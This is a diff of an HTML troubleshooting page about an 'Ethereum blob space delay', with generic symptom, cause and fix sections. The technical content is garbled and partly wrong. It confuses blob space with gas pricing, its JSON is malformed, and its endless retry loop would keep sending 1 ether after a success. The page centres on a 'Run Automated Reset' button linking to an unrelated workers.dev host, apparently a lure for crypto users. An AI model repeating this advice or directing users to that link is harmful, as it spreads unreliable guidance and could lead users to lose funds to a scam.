@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: system-ui;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,31 +41,29 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed blob space allocation on the Ethereum network, resulting in slower than expected transaction processing times and potential timeouts.</li>
+<li>Users experience delays in Ethereum transactions, with error messages indicating a "blob space delay" on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The Ethereum blob space delay occurs due to high network congestion and insufficient gas prices, leading to a backlog of pending transactions and slow allocation of blob space.</li>
+<li>The error occurs due to congestion in the Ethereum blockchain, where the network is unable to process transactions at the expected rate, resulting in a backlog of unconfirmed transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas price to prioritize transaction processing: </li>
-<li>Set a higher gas price using the <code>eth_sendTransaction</code> method</li>
-<li>Utilize a gas price oracle to determine the optimal gas price</li>
-<li>Implement a retry mechanism with exponential backoff to handle failed transactions</li>
+<li>Increase the gas limit to prioritize transactions: <code>eth_sendTransaction {from: '0x...', to: '0x...', value: '1 ether', gas: '2000000'}</code></li>
+<li>Use a higher gas price to incentivize miners: <code>eth_sendTransaction {from: '0x...', to: '0x...', value: '1 ether', gasPrice: '20 gwei'}</code></li>
+<li>Implement a retry mechanism with exponential backoff:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;gas&quot;:&quot;0x...&quot;,&quot;gasPrice&quot;:&quot;0x...&quot;[]}],&quot;id&quot;:1}&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>eth_sendTransaction<span class="w"> </span><span class="o">{</span>from:<span class="w"> </span><span class="s1">&#39;0x...&#39;</span>,<span class="w"> </span>to:<span class="w"> </span><span class="s1">&#39;0x...&#39;</span>,<span class="w"> </span>value:<span class="w"> </span><span class="s1">&#39;1 ether&#39;</span><span class="o">}</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">30</span>
+<span class="k">done</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities. </p>
+<p>For more advanced debugging, consider utilizing an external console for enhanced visibility into network conditions.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ethereum node synchronization with the latest blockchain data</li>
-<li>Sufficient ETH balance for transaction fees</li>
-<li>Compatible Web3 provider or library (e.g. Web3.js or Ethers.js)</li>
+<li>Basic understanding of Ethereum transaction mechanics</li>
+<li>Familiarity with gas limits and pricing</li>
+<li>Access to a compatible Ethereum client or node</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
